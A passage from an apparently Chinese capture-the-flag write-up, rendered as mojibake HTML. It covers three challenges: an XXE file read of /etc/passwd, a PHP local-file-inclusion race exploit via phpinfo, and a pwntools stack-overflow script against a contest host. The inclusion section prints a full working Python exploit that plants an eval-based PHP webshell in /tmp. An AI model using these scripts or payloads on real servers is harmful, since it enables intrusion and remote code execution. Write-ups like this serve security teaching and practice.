XMLæ–‡æœ¬å…ˆéªŒè¯æ¼æ´ï¼Œ<br>è¿™ä¸€æ­¥éª¤å°†XMLå†…å®¹å‘é€ç»™æœåŠ¡å™¨ï¼Œå½“æœåŠ¡å™¨å°†XMLè§£æå®Œæˆåï¼Œå°±ä¼šä¾ç…§è§£æçš„å†…å®¹å·¥ä½œï¼Œè¿™æ®µXMLä¸­SYSTEM â€œfile:///etc/passwdâ€éƒ¨åˆ†å¼•ç”¨äº†ç›®æ ‡æœåŠ¡å™¨(å³172.16.12.2)ä¸‹çš„/etc/passwdæ–‡ä»¶ï¼ŒæœåŠ¡å™¨è§£æXMLå†…å®¹åï¼Œä¼šå°†è¿™ä¸€æ–‡ä»¶å†…å®¹å­˜å…¥&amp;xxeä¸­ï¼Œç„¶åå°†æ•°æ®è¿”å›ç»™æ¶æ„è®¿é—®è€…ã€‚<br>æ‰§è¡Œå®Œæˆä¸Šé¢çš„æ“ä½œåï¼Œç‚¹å‡»GOï¼Œå³ä¾§å°†å‡ºç°æ­¤æ•°æ®åŒ…çš„è¿”å›ç»“æœï¼Œå†…å®¹å¦‚ä¸‹ï¼Œè¿”å›çš„æ•°æ®ä¸ºæœåŠ¡å™¨ä¸Š/etc/passwdæ–‡ä»¶çš„å†…å®¹<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113909-9b4cfdf2-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113909-9b4cfdf2-a456-1.png" alt="img"></a></p><p>æ¼æ´éªŒè¯æˆåŠŸï¼Œ<br>äºæ˜¯ä¿®æ”¹XMLä¸­çš„å¤–éƒ¨å®ä½“ä¸ºå…¶ä»–åè®®ï¼Œæ ¹æ®æç¤ºçœ‹hintï¼Œphp://filter/read=convert.base64-encode/resource=hint.phpï¼Œ åœ¨Proxyé€‰é¡¹å¡çš„åŸæ•°æ®åŒ…ä¸­ç²˜è´´XMLå†…å®¹ï¼Œç‚¹å‡»FORWARDæ”¾è¡Œè¯·æ±‚ï¼Œè¿”å›çš„ç»“æœ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113923-a423271c-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113923-a423271c-a456-1.png" alt="img"></a></p><p>è§£ç åå¾—åˆ°ç›®å½•ï¼Œ<br>äºæ˜¯<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113936-ab5c0b66-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113936-ab5c0b66-a456-1.png" alt="img"></a></p><p>è§£ç å¾—åˆ°flag</p><h3 id="inclusion"><a href="#inclusion" class="headerlink" title="inclusion"></a>inclusion</h3><p>è¿›å…¥é¡µé¢ï¼Œf12ï¼Œå‘ç°æ³¨é‡Š phpinfo.php<br>ç„¶åæ ¹æ®åå­—ï¼ŒçŒœæµ‹æ˜¯phpæ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆåˆ©ç”¨phpinfoï¼‰<br>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼ˆåˆæ˜¯è·Ÿç€æ–‡ç« èµ°ï¼‰<a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a><br>è®¿é—®<a href="http://47.110.227.208:8001/lfi.php?file=/etc/passwd" target="_blank" rel="noopener">http://47.110.227.208:8001/lfi.php?file=/etc/passwd</a> éªŒè¯æ¼æ´ï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712115212-6e4f092e-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712115212-6e4f092e-a458-1.png" alt="img"></a><br>æˆåŠŸã€‚<br>æ–‡ç« å¦‚æ˜¯è¯´ï¼š<br>å…ˆè®²ä¸€ä¸‹åˆ©ç”¨phpinfoä¸Šä¼ æ–‡ä»¶ï¼Œç„¶ååœ¨æ–‡ä»¶åŒ…å«çš„åŸç†ï¼š</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p><p>åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºè®¿é—®çš„ä»£ç ä¸­æ˜¯å¦æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼Œphpéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/tmp/php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œè¿™ä¸ªä¸´æ—¶æ–‡ä»¶åœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ï¼ŒåŒæ—¶ï¼Œphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ã€‚ä½†æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ã€‚</p><p>å› ä¸ºåœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«åˆ é™¤ï¼Œç¬¬äºŒä¸ªè¯·æ±‚å°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚</p><p>ä½†æ˜¯è¿™å¹¶ä¸ä»£è¡¨æˆ‘ä»¬æ²¡æœ‰åŠæ³•å»åˆ©ç”¨è¿™ç‚¹ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œåªè¦å‘é€è¶³å¤Ÿå¤šçš„æ•°æ®ï¼Œè®©é¡µé¢è¿˜æœªååº”è¿‡æ¥ï¼Œå°±ä¸Šä¼ æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ï¼Œç„¶åæ–‡ä»¶åŒ…å«ï¼š</p><p>1ï¼‰å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerï¼Œgetç­‰ä½ç½®ä¸€å®šè¦å¡æ»¡åƒåœ¾æ•°æ®ï¼›</p><p>2ï¼‰phpinfoè¿™æ—¶ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œå…¶ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†phpinfoæ’‘å¾—éå¸¸å¤§</p><p>3ï¼‰PHPé»˜è®¤ç¼“å†²åŒºå¤§å°æ˜¯4096ï¼Œå³PHPæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥</p><p>4ï¼‰æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ï¼Œåªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…</p><p>5ï¼‰æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å…¶å®è¿˜æ²¡æœ‰ç»“æŸï¼Œä½†æ˜¯PHPè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶è¿˜æœªè¢«åˆ é™¤</p><p>6ï¼‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼ŒæˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ågetshell<br>åˆ©ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114235-163015cc-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114235-163015cc-a457-1.png" alt="img"></a></p><p>è¿è¡Œè„šæœ¬<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114247-1d6315ec-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114247-1d6315ec-a457-1.png" alt="img"></a></p><p>ï¼ˆè¡¨ç¤ºåæ¥æ²¡æœ‰ä¸Šä¼ æˆåŠŸï¼Œä½†ä¼¼ä¹æœ‰å¤§ä½¬å…ˆä¸Šä¼ æˆåŠŸäº†ï¼Œæ‰€ä»¥åé¢çš„æ­¥éª¤æˆ‘ä¹Ÿèƒ½ç»§ç»­åšï¼‰<br>å…ˆéªŒè¯æ˜¯å¦ä¸Šä¼ æˆåŠŸ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114308-2a39218a-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114308-2a39218a-a457-1.png" alt="img"></a></p><p>å—¯ï¼Œçš„ç¡®æœ‰å¤§ä½¬ä¸Šä¼ æˆåŠŸäº†ï¼Œè¿æ–‡ä»¶åä¹Ÿä¸€æ ·ï¼Œå¥½çš„ï¼Œè°¢è°¢äº†ã€‚getsheell<br>äºæ˜¯<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114320-30ea4d1a-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114320-30ea4d1a-a457-1.png" alt="img"></a><br>flagåº”è¯¥åœ¨é‚£ä¸ªå¥‡æ€ªåå­—çš„æ–‡ä»¶é‡Œå§<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114328-35b74f00-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114328-35b74f00-a457-1.png" alt="img"></a><br>æœç„¶ï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114335-3a4e6094-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114335-3a4e6094-a457-1.png" alt="img"></a><br>æ‹¿åˆ°flag<br>è¿™é¢˜çš„å…³é”®è¿˜æ˜¯ä¸Šä¼ æœ‰å¤§é‡åƒåœ¾æ•°æ®çš„æ¶æ„æ–‡ä»¶å§ã€‚ï¼ˆæ‰€ä»¥å“ªä½å¤§ä½¬ä¸Šä¼ æˆåŠŸäº†ï¼‰</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="hardpwn"><a href="#hardpwn" class="headerlink" title="hardpwn"></a>hardpwn</h3><p>å¯¼å…¥IDAåï¼Œå‘ç°éœ€è¦è¦†ç›–è¿è¡Œå‚æ•°ï¼ˆå³argvï¼‰ï¼Œå› ä¸ºæ ˆæº¢å‡ºå¾ˆé•¿ä¸”å¯ä»¥è¦†ç›–åˆ°è¯¥å‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘ç›´æ¥è¦†ç›–</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="built_in">import</span> *</span><br><span class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></span><br><span class="line">context.<span class="attr">arch</span> = <span class="string">"amd64"</span></span><br><span class="line"><span class="attr">elf</span> = ELF(<span class="string">"pwn1"</span>)</span><br><span class="line"><span class="attr">sh</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">lib</span> = <span class="number">0</span></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    <span class="keyword">if</span>(<span class="attr">debug</span> == <span class="number">1</span>):</span><br><span class="line">        <span class="attr">sh</span> = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        <span class="attr">sh</span> = remote(ip,port)</span><br><span class="line">    <span class="attr">payload</span> = '\x00' * <span class="number">120</span> +<span class="string">"aaaa"</span> + <span class="string">"\x00"</span></span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10001</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114354-45684e40-a457-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114354-45684e40-a457-1.png" alt="img"></a></p><h3 id="stackpwn"><a href="#stackpwn" class="headerlink" 